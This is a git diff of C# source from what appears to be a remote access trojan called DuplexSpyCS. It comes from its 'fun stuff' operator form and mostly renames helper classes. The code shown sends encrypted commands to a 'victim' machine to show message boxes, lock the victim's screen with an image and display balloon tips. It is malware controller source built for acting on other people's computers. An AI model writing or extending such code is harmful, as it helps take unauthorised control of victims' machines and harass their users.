@@ -20,8 +20,8 @@ namespace DuplexSpyCS
 {
     public partial class frmFunStuff : Form
     {
-        private IniManager ini_manager;
-        public Victim v;
+        private clsIniManager ini_manager;
+        public clsVictim v;
 
         public frmFunStuff()
         {
@@ -61,7 +61,7 @@ namespace DuplexSpyCS
             comboBox2.SelectedIndex = 6;
             numericUpDown2.Value = 10000; //Miliseconds.
 
-            SettingConfig config = C1.GetConfigFromINI();
+            SettingConfig config = clsTools.GetConfigFromINI();
             textBox1.Text = config.msgbox_szCaption;
             textBox2.Text = config.msgbox_szText;
 
@@ -93,7 +93,7 @@ namespace DuplexSpyCS
             else if (radioButton2.Checked)
                 mode = "inf|start";
 
-            v.encSend(2, 0, $"fun|msg|{mode}|{Crypto.b64E2Str(textBox1.Text)}|{Crypto.b64E2Str(textBox2.Text)}|{comboBox1.Text}|{comboBox2.Text.Replace(",", string.Empty)}");
+            v.encSend(2, 0, $"fun|msg|{mode}|{clsCrypto.b64E2Str(textBox1.Text)}|{clsCrypto.b64E2Str(textBox2.Text)}|{comboBox1.Text}|{comboBox2.Text.Replace(",", string.Empty)}");
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -139,7 +139,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            string szImgB64 = C2.ImageToBase64(img);
+            string szImgB64 = clsTools.ImageToBase64(img);
             if (string.IsNullOrEmpty(szImgB64))
             {
                 MessageBox.Show("Image base64 string is null or empty.", "NULL", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -158,7 +158,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            v.encSend(2, 0, "fun|screen|lock|" + C2.ImageToBase64(filename));
+            v.encSend(2, 0, "fun|screen|lock|" + clsTools.ImageToBase64(filename));
         }
 
         private void groupBox2_Enter(object sender, EventArgs e)
@@ -311,7 +311,7 @@ namespace DuplexSpyCS
         //Balloon tip - Go
         private void button7_Click_1(object sender, EventArgs e)
         {
-            v.SendCommand($"fun|balloontip|{(int)numericUpDown2.Value}|{comboBox4.SelectedIndex}|{comboBox3.Text}|{Crypto.b64E2Str(textBox6.Text)}|{Crypto.b64E2Str(textBox7.Text)}");
+            v.SendCommand($"fun|balloontip|{(int)numericUpDown2.Value}|{comboBox4.SelectedIndex}|{comboBox3.Text}|{clsCrypto.b64E2Str(textBox6.Text)}|{clsCrypto.b64E2Str(textBox7.Text)}");
         }
 
         private void toolStripMenuItem4_Click(object sender, EventArgs e)
